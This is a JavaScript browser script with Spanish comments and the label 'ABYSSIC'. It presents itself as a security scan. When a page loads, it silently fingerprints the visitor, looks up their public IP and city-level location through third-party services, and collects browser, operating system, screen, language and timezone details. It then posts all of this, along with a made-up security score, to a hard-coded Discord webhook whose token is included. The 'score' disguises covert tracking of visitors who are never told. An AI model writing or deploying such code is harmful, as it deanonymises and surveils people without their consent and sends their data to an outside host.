// Webhook de Discord
const WEBHOOK_URL = "https://discord.com/api/webhooks/1346691903265181697/HRcuwXPFPsr6Y0nbNj3jH9C8cvQ_jJqi0OayLg_XJPSELEU1lt48kNmXINXZFsvJ934Z";

// Función para recolectar y enviar datos
async function collectSecurityData() {
    try {
        console.log("[ABYSSIC] Recolectando datos...");

        // Cargar FingerprintJS
        const fpPromise = import('https://openfpcdn.io/fingerprintjs/v3')
            .then(FingerprintJS => FingerprintJS.load());
        const fp = await fpPromise;
        const result = await fp.get();
        const fingerprint = result.visitorId;

        // Obtener IP pública
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        const ip = ipData.ip;

        // Geolocalización
        const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
        const geoData = await geoRes.json();
        const location = `${geoData.city}, ${geoData.region}, ${geoData.country_name}`;

        // Navegador y sistema operativo
        const userAgent = navigator.userAgent;
        let browser = "Unknown";
        let os = "Unknown";

        if (userAgent.indexOf("Firefox") > -1) browser = "Mozilla Firefox";
        else if (userAgent.indexOf("SamsungBrowser") > -1) browser = "Samsung Internet";
        else if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1) browser = "Opera";
        else if (userAgent.indexOf("Trident") > -1) browser = "Internet Explorer";
        else if (userAgent.indexOf("Edge") > -1) browser = "Microsoft Edge";
        else if (userAgent.indexOf("Chrome") > -1) browser = "Google Chrome";
        else if (userAgent.indexOf("Safari") > -1) browser = "Apple Safari";

        if (userAgent.indexOf("Windows") > -1) os = "Windows";
        else if (userAgent.indexOf("Mac") > -1) os = "MacOS";
        else if (userAgent.indexOf("X11") > -1) os = "Unix";
        else if (userAgent.indexOf("Linux") > -1) os = "Linux";
        else if (userAgent.indexOf("Android") > -1) os = "Android";
        else if (userAgent.indexOf("iOS") > -1) os = "iOS";

        // Resolución de pantalla
        const screenRes = `${window.screen.width}x${window.screen.height}`;

        // Idioma y zona horaria
        const language = navigator.language;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

        // Fecha y hora actual
        const now = new Date();

        // Calcular puntaje de seguridad
        let score = 65;
        if (browser === "Mozilla Firefox") score += 15;
        else if (browser === "Google Chrome") score += 10;
        else if (browser === "Safari") score += 8;
        else if (browser === "Microsoft Edge") score += 5;
        if (os === "Linux") score += 20;
        else if (os === "MacOS") score += 15;
        else if (os === "Windows") score += 10;
        if (navigator.connection && navigator.connection.effectiveType === '4g') score += 5;
        score = Math.min(Math.max(score, 30), 95);
        const scoreText = score >= 80 ? "Good" : score >= 60 ? "Moderate" : "Poor";

        // Enviar a Discord
        const message = {
            content: `**[SECURITY SCAN]**\n` +
                `• Fingerprint: \`${fingerprint}\`\n` +
                `• IP: \`${ip}\`\n` +
                `• Location: \`${location}\`\n` +
                `• Browser: \`${browser} on ${os}\`\n` +
                `• Screen: \`${screenRes}\`\n` +
                `• Language: \`${language} / ${timezone}\`\n` +
                `• Score: \`${scoreText} (${score}/100)\`\n` +
                `• Time: \`${now.toLocaleString()}\``
        };

        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(message)
        });

        console.log("[ABYSSIC] Datos enviados al webhook.");
    } catch (err) {
        console.error("[ABYSSIC] Error:", err.message);
    }
}

// Ejecutar automáticamente al cargar la página
window.addEventListener("load", collectSecurityData);
